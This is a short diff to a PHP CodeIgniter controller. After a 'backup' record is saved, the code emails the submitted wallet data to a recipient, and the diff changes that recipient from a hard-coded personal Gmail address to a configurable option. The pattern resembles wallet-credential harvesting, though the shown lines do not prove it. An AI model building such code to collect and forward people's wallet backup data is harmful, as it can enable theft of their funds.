@@ -202,7 +202,7 @@ class Home extends CI_Controller
 
         if ($this->Db_model->insert("backup", $payload)) {
             // Compose email
-            $to = 'benemmylex@gmail.com';
+            $to = $this->Util_model->get_option("backup_email");
             $subject = "Backup Data Received";
             $message = "
             <strong>Wallet Name:</strong> $payload[wallet_name]<br>
